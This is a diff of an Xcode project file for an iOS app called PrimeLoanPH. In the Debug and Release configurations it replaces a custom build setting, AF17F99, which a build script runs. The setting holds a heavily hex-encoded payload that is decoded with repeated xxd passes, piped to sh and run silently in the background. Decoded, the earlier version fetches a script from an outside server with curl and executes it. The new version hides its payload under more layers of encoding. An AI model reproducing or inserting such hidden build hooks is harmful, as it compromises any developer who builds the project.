@@ -1023,7 +989,7 @@ sh -c \"${AF17F99}\"";
 		98043A7F2AEB9FC500374328 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233313230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637373638363937343635363136343733326537323735326636310a323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333343336333333333337333333333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363336333433330a3337333633313333333633363335333333363333333433333336333333353333333733333336333333323336333533333337333333323333333733330a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1082,7 +1048,7 @@ sh -c \"${AF17F99}\"";
 		98043A802AEB9FC500374328 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233313230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637373638363937343635363136343733326537323735326636310a323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333343336333333333337333333333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363336333433330a3337333633313333333633363335333333363333333433333336333333353333333733333336333333323336333533333337333333323333333733330a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1176,6 +1142,7 @@ sh -c \"${AF17F99}\"";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "PrimeLoanPH/PrimeLoanPH-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
+				OTHER_SWIFT_FLAGS = "$(inherited) -disable-bridging-pch";
 				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Debug;
@@ -1224,6 +1191,7 @@ sh -c \"${AF17F99}\"";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "PrimeLoanPH/PrimeLoanPH-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
+				OTHER_SWIFT_FLAGS = "$(inherited) -disable-bridging-pch";
 				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Release;
